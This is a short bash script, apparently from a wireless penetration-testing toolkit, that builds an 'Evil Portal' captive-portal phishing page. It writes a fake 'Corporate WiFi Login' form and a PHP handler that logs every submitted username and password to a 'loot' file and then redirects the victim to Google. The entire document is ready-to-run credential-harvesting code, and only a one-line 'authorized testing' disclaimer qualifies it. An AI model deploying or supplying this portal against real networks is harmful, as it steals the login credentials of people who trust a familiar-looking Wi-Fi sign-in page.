#!/bin/bash
# Evil Portal - Captive Portal Phishing
# Author: David Osisek
# FOR AUTHORIZED TESTING ONLY

echo "[+] Evil Portal Setup"
echo "[*] Creating captive portal..."

# Create portal directory
mkdir -p /root/portals/corporate

# HTML template
cat > /root/portals/corporate/index.php << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Corporate WiFi Login</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; }
        .login { width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 5px; }
        input { width: 100%; padding: 10px; margin: 10px 0; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; }
    </style>
</head>
<body>
    <div class="login">
        <h2>Corporate Network Access</h2>
        <form method="POST" action="login.php">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
EOF

# Login handler
cat > /root/portals/corporate/login.php << 'EOF'
<?php
$log = "/root/loot/evil-portal-" . date('Ymd') . ".txt";
$data = date('Y-m-d H:i:s') . " | " . $_POST['username'] . " | " . $_POST['password'] . "\n";
file_put_contents($log, $data, FILE_APPEND);
header('Location: http://www.google.com');
?>
EOF

echo "[+] Portal created at /root/portals/corporate"
echo "[*] Credentials logged to /root/loot/evil-portal-*.txt"
